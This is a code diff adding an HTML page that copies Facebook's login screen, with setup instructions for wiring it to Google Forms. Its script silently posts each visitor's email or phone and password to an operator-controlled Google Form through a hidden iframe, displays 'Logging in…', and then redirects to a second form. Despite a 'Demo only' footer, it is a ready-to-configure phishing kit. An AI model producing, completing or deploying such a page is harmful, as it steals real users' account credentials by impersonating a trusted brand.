@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook – Log in or sign up</title>
+  <style>
+    /* ── Reset ────────────────────────────────────────────── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* ── Layout ───────────────────────────────────────────── */
+    .wrapper {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: center;
+      gap: 32px;
+      width: 100%;
+      max-width: 980px;
+      padding: 20px;
+    }
+
+    /* ── Left panel ───────────────────────────────────────── */
+    .hero {
+      flex: 1 1 300px;
+      max-width: 500px;
+    }
+    .hero .logo {
+      color: #1877f2;
+      font-size: 60px;
+      font-weight: 700;
+      letter-spacing: -2px;
+      line-height: 1;
+      margin-bottom: 16px;
+    }
+    .hero p {
+      font-size: 26px;
+      line-height: 32px;
+      color: #1c1e21;
+    }
+
+    /* ── Login card ───────────────────────────────────────── */
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+      padding: 20px 24px 28px;
+      width: 100%;
+      max-width: 396px;
+    }
+
+    .card input[type="text"],
+    .card input[type="email"],
+    .card input[type="password"],
+    .card input[type="tel"] {
+      width: 100%;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+      outline: none;
+      transition: border-color .15s;
+    }
+    .card input:focus { border-color: #1877f2; }
+
+    .btn-login {
+      width: 100%;
+      background: #1877f2;
+      border: none;
+      border-radius: 6px;
+      color: #fff;
+      cursor: pointer;
+      font-size: 20px;
+      font-weight: 700;
+      padding: 14px;
+      transition: background .15s;
+    }
+    .btn-login:hover { background: #166fe5; }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+
+    .btn-new-account {
+      display: block;
+      width: fit-content;
+      margin: 0 auto;
+      background: #42b72a;
+      border: none;
+      border-radius: 6px;
+      color: #fff;
+      cursor: pointer;
+      font-size: 17px;
+      font-weight: 700;
+      padding: 14px 20px;
+      text-decoration: none;
+      transition: background .15s;
+    }
+    .btn-new-account:hover { background: #36a420; }
+
+    .forgot-link {
+      display: block;
+      color: #1877f2;
+      font-size: 14px;
+      text-align: center;
+      margin-top: 16px;
+      text-decoration: none;
+    }
+    .forgot-link:hover { text-decoration: underline; }
+
+    /* Status message shown to user while submitting */
+    #status-msg {
+      font-size: 13px;
+      color: #606770;
+      text-align: center;
+      min-height: 18px;
+      margin-top: 8px;
+    }
+
+    /* Hidden iframe used to silently POST to Google Forms */
+    #hidden-frame { display: none; }
+
+    /* ── Footer ───────────────────────────────────────────── */
+    footer {
+      margin-top: 28px;
+      color: #737373;
+      font-size: 12px;
+      text-align: center;
+      padding: 0 20px 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Hidden iframe: receives the Google Forms response so the main page
+       stays on the login screen while the POST completes silently. -->
+  <iframe id="hidden-frame" name="hidden-frame" title="form-target"></iframe>
+
+  <div class="wrapper">
+
+    <!-- Left: branding -->
+    <div class="hero">
+      <div class="logo">facebook</div>
+      <p>Connect with friends and the world around you on Facebook.</p>
+    </div>
+
+    <!-- Right: login card -->
+    <div class="card">
+      <!--
+        ════════════════════════════════════════════════════════
+        HOW TO CONNECT THIS FORM TO GOOGLE SHEETS
+        ════════════════════════════════════════════════════════
+        1. Create a Google Form with two questions:
+             Question 1 – "Email or Phone"   (Short Answer)
+             Question 2 – "Password"         (Short Answer)
+        2. Click ⋮ → Get pre-filled link, fill in dummy values,
+           copy the URL and find the entry IDs
+           (they look like  entry.1234567890).
+        3. Replace the two placeholder values below:
+             GOOGLE_FORM_ID      → the long ID from your form URL
+             ENTRY_ID_EMAIL      → entry ID for "Email or Phone"
+             ENTRY_ID_PASSWORD   → entry ID for "Password"
+        4. For the Google Form redirect (step 2 of the flow),
+           replace  GOOGLE_FORM_SURVEY_URL  with the public URL
+           of the second form users should fill in.
+        ════════════════════════════════════════════════════════
+      -->
+
+      <!-- ── Credentials collection form ───────────────────── -->
+      <form id="login-form" method="POST" novalidate>
+        <input
+          id="field-email"
+          type="text"
+          name="email"
+          placeholder="Email address or phone number"
+          autocomplete="username"
+          required
+        />
+        <input
+          id="field-password"
+          type="password"
+          name="password"
+          placeholder="Password"
+          autocomplete="current-password"
+          required
+        />
+
+        <button type="submit" class="btn-login">Log in</button>
+        <p id="status-msg"></p>
+      </form>
+
+      <a href="#" class="forgot-link">Forgotten password?</a>
+
+      <hr class="divider" />
+      <a href="#" class="btn-new-account">Create new account</a>
+    </div>
+
+  </div>
+
+  <footer>
+    &copy; 2026 Facebook Clone &nbsp;|&nbsp; Demo only
+  </footer>
+
+  <script>
+    /*
+     * ── Configuration ─────────────────────────────────────────────────────────
+     * Replace the three placeholder strings below with your real values.
+     * ──────────────────────────────────────────────────────────────────────────
+     */
+    const GOOGLE_FORM_ID       = "YOUR_GOOGLE_FORM_ID";       // e.g. "1FAIpQLSd..."
+    const ENTRY_ID_EMAIL       = "entry.YOUR_EMAIL_ENTRY_ID"; // e.g. "entry.123456789"
+    const ENTRY_ID_PASSWORD    = "entry.YOUR_PASS_ENTRY_ID";  // e.g. "entry.987654321"
+
+    // URL of the second Google Form the user should be redirected to after login
+    const GOOGLE_FORM_SURVEY_URL = "https://docs.google.com/forms/d/YOUR_SURVEY_FORM_ID/viewform";
+
+    /*
+     * ── Submit handler ────────────────────────────────────────────────────────
+     * 1. Validates that both fields are filled.
+     * 2. Silently POSTs the credentials to the first Google Form
+     *    (response goes into the hidden iframe to avoid page reload).
+     * 3. After a short delay redirects the browser to the survey form.
+     * ──────────────────────────────────────────────────────────────────────────
+     */
+    document.getElementById("login-form").addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      const email    = document.getElementById("field-email").value.trim();
+      const password = document.getElementById("field-password").value;
+      const statusEl = document.getElementById("status-msg");
+
+      // Guard: warn if the owner has not yet replaced the placeholder config values
+      if (
+        GOOGLE_FORM_ID.startsWith("YOUR_") ||
+        ENTRY_ID_EMAIL.startsWith("entry.YOUR_") ||
+        ENTRY_ID_PASSWORD.startsWith("entry.YOUR_") ||
+        GOOGLE_FORM_SURVEY_URL.includes("YOUR_")
+      ) {
+        statusEl.style.color = "#fa3e3e";
+        statusEl.textContent  =
+          "⚠️ Configuration incomplete – replace the placeholder values in the script block.";
+        return;
+      }
+
+      // Basic client-side validation
+      if (!email || !password) {
+        statusEl.style.color = "#fa3e3e";
+        statusEl.textContent  = "Please enter your email/phone and password.";
+        return;
+      }
+
+      statusEl.style.color = "#606770";
+      statusEl.textContent = "Logging in…";
+
+      // Build the Google Forms submission URL
+      const formAction = `https://docs.google.com/forms/d/${GOOGLE_FORM_ID}/formResponse`;
+
+      // Create a temporary <form> that posts into the hidden iframe
+      const tempForm        = document.createElement("form");
+      tempForm.method       = "POST";
+      tempForm.action       = formAction;
+      tempForm.target       = "hidden-frame"; // targets the hidden <iframe>
+      tempForm.style.display = "none";
+
+      const addField = (name, value) => {
+        const input   = document.createElement("input");
+        input.type    = "hidden";
+        input.name    = name;
+        input.value   = value;
+        tempForm.appendChild(input);
+      };
+
+      addField(ENTRY_ID_EMAIL,    email);
+      addField(ENTRY_ID_PASSWORD, password);
+
+      document.body.appendChild(tempForm);
+      tempForm.submit();
+      document.body.removeChild(tempForm);
+
+      // Give the iframe POST a moment to fire, then redirect to the survey form
+      setTimeout(() => {
+        window.location.href = GOOGLE_FORM_SURVEY_URL;
+      }, 800);
+    });
+  </script>
+
+</body>
+</html>
